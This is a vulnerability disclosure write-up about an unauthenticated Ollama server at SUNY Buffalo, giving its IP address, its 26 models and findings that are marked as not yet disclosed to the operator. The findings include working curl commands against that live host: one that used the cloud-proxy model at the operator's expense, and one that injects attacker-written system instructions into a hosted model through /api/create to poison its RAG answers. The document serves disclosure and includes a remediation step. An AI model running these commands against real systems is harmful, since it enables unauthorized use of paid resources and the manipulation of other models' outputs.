# SUNY Buffalo — Unauthenticated Ollama + Cloud Proxy Quota Hijack Confirmed

_NuClide Research · 2026-05-01_

---

## Summary

State University of New York at Buffalo research compute node running 26 Ollama models including `gemma4:31b-cloud`, a cloud proxy model. **Cloud proxy inference confirmed live — 200 OK response at operator expense.** Also includes RAG pipeline components (embedding model + reranker) and a 74GB Mixtral instance. Raw Ollama port publicly accessible, no authentication.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 136.183.56.88 |
| Org | SUNY Buffalo State University |
| Country | US — New York |
| Open ports | 11434 (Ollama — **public**) |

---

## Models (26 total)

| Model | Size | Notes |
|---|---|---|
| **gemma4:31b-cloud** | **0 GB** | **☁️ Cloud proxy — CONFIRMED LIVE** |
| mixtral:8x22b-instruct | 74 GB | Local — MoE |
| qwen2.5:72b-instruct | 44 GB | Local |
| llama3.1:70b | 39 GB | Local |
| qwen3.5:35b | 22 GB | Local |
| qwen2.5:32b-instruct | 18 GB | Local |
| gemma4:31b-it-q4_K_M | 18 GB | Local |
| gemma4:31B | 18 GB | Local |
| glm-4.7-flash:latest | 17 GB | Local (Zhipu AI) |
| gemma4:26B | 16 GB | Local |
| gemma4:e4B | 8 GB | Local |
| qwen3:14b | 8 GB | Local |
| phi4:latest | 8 GB | Local |
| gemma4:latest | 8 GB | Local |
| qwen2.5:14b-instruct | 8 GB | Local |
| qwen2.5vl:7b (equivalent) | 8 GB | Local |
| gemma3:27B | 16 GB | Local |
| gemma4:e2B | 6 GB | Local |
| gemma2:9b | 5 GB | Local |
| llama3.1:8b | 4 GB | Local |
| qwen2.5:7b-instruct | 4 GB | Local |
| llama3.2:3b | 1 GB | Local |
| bge-m3:latest | 1 GB | **Embedding — RAG pipeline** |
| smollm2:135m | 0 GB | Local |
| qllama/bge-reranker-v2-m3:latest | 0 GB | **Reranker — RAG pipeline** |

---

## Findings

### F1 — Cloud Proxy Quota Hijack (CRITICAL)

`gemma4:31b-cloud` returned **200 OK** without any authentication:

```bash
curl http://136.183.56.88:11434/api/generate \
  -d '{"model":"gemma4:31b-cloud","prompt":"say: Buffalo","stream":false}'
# → 200 OK, response: "Buffalo", eval_count: 2
```

Two tokens generated at operator's cloud API expense. No authentication, no rate limiting visible from outside.

### F2 — Unauthenticated RAG Pipeline Components (HIGH)

The deployment includes BGE-M3 embedding model and BGE-reranker-v2-M3, indicating an active RAG pipeline. If this Ollama instance backs a document retrieval system with university data, model injection via CVE-2025-63389 would affect all RAG-augmented responses — including content derived from indexed university documents.

```bash
# Inject into any model to affect RAG responses
curl -X POST http://136.183.56.88:11434/api/create \
  -d '{"model":"qwen3:14b","from":"qwen3:14b","system":"[attacker instructions]"}'
```

### F3 — 26-Model Unauthenticated Surface (HIGH)

26 models accessible including heavy compute (Mixtral 8x22B, Qwen2.5-72B, LLaMA3.1-70B). All injectable via CVE-2025-63389. Total local model storage: ~350+ GB.

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

---

## Disclosure

- **Discovered:** 2026-05-01
- **Cloud proxy confirmed:** 200 OK, 2 tokens at operator expense
- **Status:** Pending outreach to SUNY Buffalo IT Security
